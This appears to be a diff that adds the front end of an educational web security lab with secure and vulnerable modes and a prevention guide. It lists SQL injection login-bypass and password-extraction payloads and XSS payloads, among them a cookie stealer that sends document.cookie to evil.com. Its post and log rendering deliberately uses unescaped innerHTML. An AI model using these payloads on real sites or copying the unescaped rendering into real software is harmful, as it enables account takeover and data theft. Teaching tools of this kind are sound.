@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web Security Lab - Educational Platform</title>
+  <style>
+    :root {
+      --primary: #2563eb;
+      --danger: #dc2626;
+      --success: #16a34a;
+      --warning: #d97706;
+      --bg: #f8fafc;
+      --card: #ffffff;
+      --text: #1e293b;
+      --border: #e2e8f0;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    header {
+      background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+      color: white;
+      padding: 20px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+    }
+    
+    header h1 {
+      font-size: 1.8rem;
+      margin-bottom: 5px;
+    }
+    
+    .mode-badge {
+      display: inline-block;
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 0.9rem;
+    }
+    
+    .mode-secure {
+      background: var(--success);
+    }
+    
+    .mode-vulnerable {
+      background: var(--danger);
+    }
+    
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+      gap: 20px;
+    }
+    
+    .card {
+      background: var(--card);
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      border: 1px solid var(--border);
+    }
+    
+    .card h2 {
+      font-size: 1.2rem;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .card h2 .icon {
+      font-size: 1.4rem;
+    }
+    
+    .form-group {
+      margin-bottom: 15px;
+    }
+    
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 5px;
+      font-size: 0.9rem;
+    }
+    
+    input, textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: border-color 0.2s;
+    }
+    
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: var(--primary);
+    }
+    
+    button {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: 600;
+      transition: opacity 0.2s;
+    }
+    
+    button:hover {
+      opacity: 0.9;
+    }
+    
+    button.danger {
+      background: var(--danger);
+    }
+    
+    button.success {
+      background: var(--success);
+    }
+    
+    .attack-btn {
+      background: var(--warning);
+      margin: 5px;
+      padding: 8px 12px;
+      font-size: 0.85rem;
+    }
+    
+    .result {
+      background: #f1f5f9;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 0.85rem;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    
+    .result.error {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: var(--danger);
+    }
+    
+    .result.success {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      color: var(--success);
+    }
+    
+    .log-entry {
+      padding: 8px;
+      margin: 5px 0;
+      border-radius: 4px;
+      font-size: 0.8rem;
+    }
+    
+    .log-entry.attack {
+      background: #fef2f2;
+      border-left: 3px solid var(--danger);
+    }
+    
+    .log-entry.info {
+      background: #eff6ff;
+      border-left: 3px solid var(--primary);
+    }
+    
+    .log-entry.warning {
+      background: #fffbeb;
+      border-left: 3px solid var(--warning);
+    }
+    
+    .tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    
+    .tab {
+      padding: 8px 16px;
+      background: var(--border);
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    
+    .tab.active {
+      background: var(--primary);
+      color: white;
+    }
+    
+    .hidden {
+      display: none;
+    }
+    
+    .user-info {
+      background: rgba(255,255,255,0.1);
+      padding: 10px 15px;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
+    
+    .attack-examples {
+      background: #fffbeb;
+      border: 1px solid #fcd34d;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 15px;
+    }
+    
+    .attack-examples h4 {
+      color: var(--warning);
+      margin-bottom: 10px;
+    }
+    
+    .attack-examples code {
+      display: block;
+      background: #fef3c7;
+      padding: 8px;
+      margin: 5px 0;
+      border-radius: 4px;
+      font-size: 0.85rem;
+      cursor: pointer;
+    }
+    
+    .attack-examples code:hover {
+      background: #fde68a;
+    }
+    
+    .posts-list {
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    
+    .post-item {
+      padding: 15px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    
+    .post-item h3 {
+      font-size: 1rem;
+      margin-bottom: 5px;
+    }
+    
+    .post-meta {
+      font-size: 0.8rem;
+      color: #64748b;
+    }
+    
+    .explanation {
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      font-size: 0.9rem;
+    }
+    
+    .explanation h4 {
+      color: var(--primary);
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🔐 Web Security Lab</h1>
+      <p>Educational platform for learning web security concepts</p>
+      <div id="modeDisplay">
+        <span class="mode-badge mode-vulnerable">Loading...</span>
+      </div>
+      <div id="userInfo" class="user-info hidden">
+        Logged in as: <strong id="currentUser">-</strong> (<span id="userRole">-</span>)
+        <button onclick="logout()" style="margin-left: 10px; padding: 5px 10px;">Logout</button>
+      </div>
+    </header>
+    
+    <div class="grid">
+      <!-- Authentication Section -->
+      <div class="card">
+        <h2><span class="icon">🔑</span> Authentication</h2>
+        
+        <div class="explanation">
+          <h4>SQL Injection Attack</h4>
+          <p>In vulnerable mode, the login uses string concatenation for SQL queries, allowing attackers to bypass authentication.</p>
+        </div>
+        
+        <div class="form-group">
+          <label>Username</label>
+          <input type="text" id="loginUsername" placeholder="Enter username">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="loginPassword" placeholder="Enter password">
+        </div>
+        <button onclick="login()">Login</button>
+        
+        <div class="attack-examples">
+          <h4>⚠️ SQL Injection Examples (Vulnerable Mode Only)</h4>
+          <code onclick="setLoginPayload(`admin'--`, 'anything')">admin'-- (bypass password check)</code>
+          <code onclick="setLoginPayload(`' OR '1'='1'--`, 'x')">&#39; OR &#39;1&#39;=&#39;1&#39;-- (login as first user)</code>
+          <code onclick="setLoginPayload(`' UNION SELECT 1,'hacker','x','admin@x.com','admin',datetime()--`, 'x')">UNION injection (create fake admin)</code>
+        </div>
+        
+        <div id="loginResult" class="result hidden"></div>
+      </div>
+      
+      <!-- User Search Section -->
+      <div class="card">
+        <h2><span class="icon">🔍</span> User Search</h2>
+        
+        <div class="explanation">
+          <h4>SQL Injection in Search</h4>
+          <p>Search functionality often uses LIKE queries. Without parameterization, attackers can extract sensitive data.</p>
+        </div>
+        
+        <div class="form-group">
+          <label>Search Query</label>
+          <input type="text" id="searchQuery" placeholder="Search users...">
+        </div>
+        <button onclick="searchUsers()">Search</button>
+        
+        <div class="attack-examples">
+          <h4>⚠️ SQL Injection Examples</h4>
+          <code onclick="setSearchPayload(`' UNION SELECT id, username, password, role, created_at FROM users--`)">Extract passwords with UNION</code>
+          <code onclick="setSearchPayload(`' OR '1'='1`)">List all users</code>
+          <code onclick="setSearchPayload(`admin' AND '1'='1`)">Find specific user</code>
+        </div>
+        
+        <div id="searchResult" class="result hidden"></div>
+      </div>
+      
+      <!-- XSS Section -->
+      <div class="card">
+        <h2><span class="icon">💉</span> Posts (XSS Demo)</h2>
+        
+        <div class="explanation">
+          <h4>Cross-Site Scripting (XSS)</h4>
+          <p>Without proper output encoding, malicious scripts can be injected and executed in other users' browsers.</p>
+        </div>
+        
+        <div class="form-group">
+          <label>Post Title</label>
+          <input type="text" id="postTitle" placeholder="Enter title">
+        </div>
+        <div class="form-group">
+          <label>Post Content</label>
+          <textarea id="postContent" rows="3" placeholder="Enter content"></textarea>
+        </div>
+        <button onclick="createPost()">Create Post</button>
+        
+        <div class="attack-examples">
+          <h4>⚠️ XSS Payload Examples</h4>
+          <code onclick="setPostPayload('XSS Test', '&lt;script&gt;alert(\"XSS!\")&lt;/script&gt;')">&lt;script&gt;alert("XSS!")&lt;/script&gt;</code>
+          <code onclick="setPostPayload('Image XSS', '&lt;img src=x onerror=alert(\"XSS\")&gt;')">&lt;img src=x onerror=alert("XSS")&gt;</code>
+          <code onclick="setPostPayload('Event XSS', '&lt;div onmouseover=alert(\"XSS\")&gt;Hover me&lt;/div&gt;')">&lt;div onmouseover=alert("XSS")&gt;</code>
+          <code onclick="setPostPayload('Cookie Stealer', '&lt;script&gt;fetch(\"http://evil.com?c=\"+document.cookie)&lt;/script&gt;')">Cookie stealing payload</code>
+        </div>
+        
+        <div id="postResult" class="result hidden"></div>
+        
+        <h3 style="margin-top: 20px;">Recent Posts</h3>
+        <button onclick="loadPosts()" style="margin: 10px 0;">Refresh Posts</button>
+        <div id="postsList" class="posts-list"></div>
+      </div>
+      
+      <!-- Security Logs Section -->
+      <div class="card">
+        <h2><span class="icon">📋</span> Security Logs</h2>
+        
+        <div class="explanation">
+          <h4>Attack Detection</h4>
+          <p>Security logs help identify attack patterns. In secure mode, suspicious inputs are blocked and logged.</p>
+        </div>
+        
+        <button onclick="loadLogs()">Refresh Logs</button>
+        <button onclick="clearLogs()" class="danger" style="margin-left: 10px;">Clear Logs</button>
+        
+        <div id="logsContainer" style="margin-top: 15px; max-height: 400px; overflow-y: auto;"></div>
+      </div>
+      
+      <!-- IDOR Section -->
+      <div class="card">
+        <h2><span class="icon">🚪</span> IDOR Demo</h2>
+        
+        <div class="explanation">
+          <h4>Insecure Direct Object Reference</h4>
+          <p>Without proper authorization checks, users can access other users' data by manipulating IDs.</p>
+        </div>
+        
+        <div class="form-group">
+          <label>User ID to View</label>
+          <input type="number" id="userIdToView" placeholder="Enter user ID (1, 2, 3...)" value="1">
+        </div>
+        <button onclick="viewUserProfile()">View Profile</button>
+        
+        <div class="attack-examples">
+          <h4>⚠️ IDOR Attack</h4>
+          <p>Try viewing user IDs 1, 2, 3 while logged in as a regular user. In vulnerable mode, you can see all profiles.</p>
+        </div>
+        
+        <div id="idorResult" class="result hidden"></div>
+      </div>
+      
+      <!-- Learning Resources -->
+      <div class="card">
+        <h2><span class="icon">📚</span> Learning Guide</h2>
+        
+        <div class="tabs">
+          <div class="tab active" onclick="showGuide('sqli')">SQL Injection</div>
+          <div class="tab" onclick="showGuide('xss')">XSS</div>
+          <div class="tab" onclick="showGuide('defense')">Defense</div>
+        </div>
+        
+        <div id="guide-sqli" class="guide-content">
+          <h4>SQL Injection Prevention</h4>
+          <ul style="margin-left: 20px; margin-top: 10px;">
+            <li><strong>Use Parameterized Queries</strong> - Never concatenate user input into SQL</li>
+            <li><strong>Input Validation</strong> - Whitelist allowed characters</li>
+            <li><strong>Least Privilege</strong> - Database user should have minimal permissions</li>
+            <li><strong>Error Handling</strong> - Don't expose database errors to users</li>
+          </ul>
+          
+          <h4 style="margin-top: 15px;">Vulnerable Code:</h4>
+          <pre style="background: #fef2f2; padding: 10px; border-radius: 4px; font-size: 0.8rem; overflow-x: auto;">
+// ❌ VULNERABLE
+const query = `SELECT * FROM users 
+  WHERE username = '${username}'`;
+          </pre>
+          
+          <h4 style="margin-top: 15px;">Secure Code:</h4>
+          <pre style="background: #f0fdf4; padding: 10px; border-radius: 4px; font-size: 0.8rem; overflow-x: auto;">
+// ✅ SECURE
+const user = db.prepare(
+  'SELECT * FROM users WHERE username = ?'
+).get(username);
+          </pre>
+        </div>
+        
+        <div id="guide-xss" class="guide-content hidden">
+          <h4>XSS Prevention</h4>
+          <ul style="margin-left: 20px; margin-top: 10px;">
+            <li><strong>Output Encoding</strong> - Escape HTML entities before rendering</li>
+            <li><strong>Content Security Policy</strong> - Restrict script sources</li>
+            <li><strong>HttpOnly Cookies</strong> - Prevent JavaScript access to cookies</li>
+            <li><strong>Input Validation</strong> - Sanitize user input</li>
+          </ul>
+          
+          <h4 style="margin-top: 15px;">Types of XSS:</h4>
+          <ul style="margin-left: 20px;">
+            <li><strong>Reflected</strong> - Payload in URL/request</li>
+            <li><strong>Stored</strong> - Payload saved in database</li>
+            <li><strong>DOM-based</strong> - Payload manipulates DOM</li>
+          </ul>
+        </div>
+        
+        <div id="guide-defense" class="guide-content hidden">
+          <h4>Defense in Depth</h4>
+          <ul style="margin-left: 20px; margin-top: 10px;">
+            <li><strong>Security Headers</strong> - CSP, X-Frame-Options, etc.</li>
+            <li><strong>Rate Limiting</strong> - Prevent brute force attacks</li>
+            <li><strong>Logging & Monitoring</strong> - Detect attacks early</li>
+            <li><strong>Input Validation</strong> - Validate all user input</li>
+            <li><strong>Authentication</strong> - Strong password policies, MFA</li>
+            <li><strong>Authorization</strong> - Proper access controls</li>
+            <li><strong>HTTPS</strong> - Encrypt data in transit</li>
+            <li><strong>Regular Updates</strong> - Patch vulnerabilities</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    // State
+    let currentMode = 'VULNERABLE';
+    let currentUser = null;
+    
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+      checkMode();
+      checkAuth();
+      loadPosts();
+      loadLogs();
+    });
+    
+    // API Helper
+    async function api(endpoint, options = {}) {
+      try {
+        const response = await fetch(endpoint, {
+          ...options,
+          headers: {
+            'Content-Type': 'application/json',
+            ...options.headers
+          },
+          credentials: 'include'
+        });
+        return await response.json();
+      } catch (err) {
+        return { error: err.message };
+      }
+    }
+    
+    // Check security mode
+    async function checkMode() {
+      const result = await api('/api/mode');
+      currentMode = result.mode;
+      const badge = document.querySelector('#modeDisplay .mode-badge');
+      badge.textContent = result.secure ? '🔒 SECURE MODE' : '⚠️ VULNERABLE MODE';
+      badge.className = `mode-badge ${result.secure ? 'mode-secure' : 'mode-vulnerable'}`;
+    }
+    
+    // Check authentication
+    async function checkAuth() {
+      const result = await api('/api/user');
+      if (result.authenticated) {
+        currentUser = result.user;
+        document.getElementById('userInfo').classList.remove('hidden');
+        document.getElementById('currentUser').textContent = result.user.username;
+        document.getElementById('userRole').textContent = result.user.role;
+      } else {
+        currentUser = null;
+        document.getElementById('userInfo').classList.add('hidden');
+      }
+    }
+    
+    // Login
+    async function login() {
+      const username = document.getElementById('loginUsername').value;
+      const password = document.getElementById('loginPassword').value;
+      
+      const result = await api('/api/login', {
+        method: 'POST',
+        body: JSON.stringify({ username, password })
+      });
+      
+      const resultDiv = document.getElementById('loginResult');
+      resultDiv.classList.remove('hidden', 'error', 'success');
+      
+      if (result.error) {
+        resultDiv.classList.add('error');
+        resultDiv.textContent = `Error: ${result.error}`;
+      } else {
+        resultDiv.classList.add('success');
+        resultDiv.textContent = `Success! Logged in as: ${result.user.username} (${result.user.role})`;
+        checkAuth();
+      }
+    }
+    
+    // Logout
+    async function logout() {
+      await api('/api/logout', { method: 'POST' });
+      checkAuth();
+      document.getElementById('loginResult').classList.add('hidden');
+    }
+    
+    // Search users
+    async function searchUsers() {
+      const query = document.getElementById('searchQuery').value;
+      const result = await api(`/api/users/search?q=${encodeURIComponent(query)}`);
+      
+      const resultDiv = document.getElementById('searchResult');
+      resultDiv.classList.remove('hidden', 'error', 'success');
+      
+      if (result.error) {
+        resultDiv.classList.add('error');
+        resultDiv.textContent = `Error: ${result.error}`;
+      } else {
+        resultDiv.classList.add('success');
+        resultDiv.textContent = JSON.stringify(result.users, null, 2);
+      }
+    }
+    
+    // Create post
+    async function createPost() {
+      const title = document.getElementById('postTitle').value;
+      const content = document.getElementById('postContent').value;
+      
+      const result = await api('/api/posts', {
+        method: 'POST',
+        body: JSON.stringify({ title, content })
+      });
+      
+      const resultDiv = document.getElementById('postResult');
+      resultDiv.classList.remove('hidden', 'error', 'success');
+      
+      if (result.error) {
+        resultDiv.classList.add('error');
+        resultDiv.textContent = `Error: ${result.error}`;
+      } else {
+        resultDiv.classList.add('success');
+        resultDiv.textContent = `Post created with ID: ${result.postId}`;
+        loadPosts();
+      }
+    }
+    
+    // Load posts
+    async function loadPosts() {
+      const result = await api('/api/posts');
+      const container = document.getElementById('postsList');
+      
+      if (result.posts && result.posts.length > 0) {
+        container.innerHTML = result.posts.map(post => `
+          <div class="post-item">
+            <h3>${post.title}</h3>
+            <p>${post.content}</p>
+            <div class="post-meta">By ${post.username} on ${new Date(post.created_at).toLocaleString()}</div>
+          </div>
+        `).join('');
+      } else {
+        container.innerHTML = '<p>No posts found</p>';
+      }
+    }
+    
+    // Load security logs
+    async function loadLogs() {
+      const result = await api('/api/security/logs');
+      const container = document.getElementById('logsContainer');
+      
+      if (result.logs && result.logs.length > 0) {
+        container.innerHTML = result.logs.map(log => {
+          let className = 'info';
+          if (log.event_type.includes('ATTACK') || log.event_type.includes('FAILED')) {
+            className = 'attack';
+          } else if (log.event_type.includes('RATE_LIMIT') || log.event_type.includes('UNAUTHORIZED')) {
+            className = 'warning';
+          }
+          
+          return `
+            <div class="log-entry ${className}">
+              <strong>${log.event_type}</strong><br>
+              <small>${new Date(log.created_at).toLocaleString()}</small><br>
+              ${log.details || ''}
+            </div>
+          `;
+        }).join('');
+      } else {
+        container.innerHTML = '<p>No security events logged</p>';
+      }
+    }
+    
+    // Clear logs
+    async function clearLogs() {
+      await api('/api/security/logs', { method: 'DELETE' });
+      loadLogs();
+    }
+    
+    // View user profile (IDOR demo)
+    async function viewUserProfile() {
+      const userId = document.getElementById('userIdToView').value;
+      const result = await api(`/api/users/${userId}`);
+      
+      const resultDiv = document.getElementById('idorResult');
+      resultDiv.classList.remove('hidden', 'error', 'success');
+      
+      if (result.error) {
+        resultDiv.classList.add('error');
+        resultDiv.textContent = `Error: ${result.error}`;
+      } else {
+        resultDiv.classList.add('success');
+        resultDiv.textContent = JSON.stringify(result.user, null, 2);
+      }
+    }
+    
+    // Helper functions for attack payloads
+    function setLoginPayload(username, password) {
+      document.getElementById('loginUsername').value = username;
+      document.getElementById('loginPassword').value = password;
+    }
+    
+    function setSearchPayload(query) {
+      document.getElementById('searchQuery').value = query;
+    }
+    
+    function setPostPayload(title, content) {
+      document.getElementById('postTitle').value = title;
+      document.getElementById('postContent').value = content.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#39;/g, "'");
+    }
+    
+    // Guide tabs
+    function showGuide(guide) {
+      document.querySelectorAll('.guide-content').forEach(el => el.classList.add('hidden'));
+      document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+      document.getElementById(`guide-${guide}`).classList.remove('hidden');
+      event.target.classList.add('active');
+    }
+  </script>
+</body>
+</html>
